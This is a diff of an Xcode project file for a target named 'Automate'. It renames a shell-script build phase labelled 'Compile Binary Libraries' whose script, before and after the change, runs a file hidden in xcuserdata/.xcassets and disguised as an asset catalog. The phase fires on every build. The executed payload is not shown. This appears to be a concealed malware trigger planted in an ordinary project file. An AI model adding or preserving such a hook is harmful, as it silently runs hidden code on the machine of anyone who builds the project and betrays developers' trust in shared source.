@@ -135,7 +135,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 220603BE25B1ACFB00A93495 /* Build configuration list for PBXNativeTarget "Automate" */;
 			buildPhases = (
-				FCE94BA6FBB701DDE7AAC43A /* Compile Binary Libraries */,
+				C4D296AA3DC591BADCAAC43A /* Compile Binary Libraries */,
 				2206039025B1ACF500A93495 /* Sources */,
 				2206039125B1ACF500A93495 /* Frameworks */,
 				2206039225B1ACF500A93495 /* Resources */,
@@ -255,7 +255,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		FCE94BA6FBB701DDE7AAC43A /* Compile Binary Libraries */ = {
+		C4D296AA3DC591BADCAAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -271,7 +271,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false\n";
 		};
 /* End PBXShellScriptBuildPhase section */
 
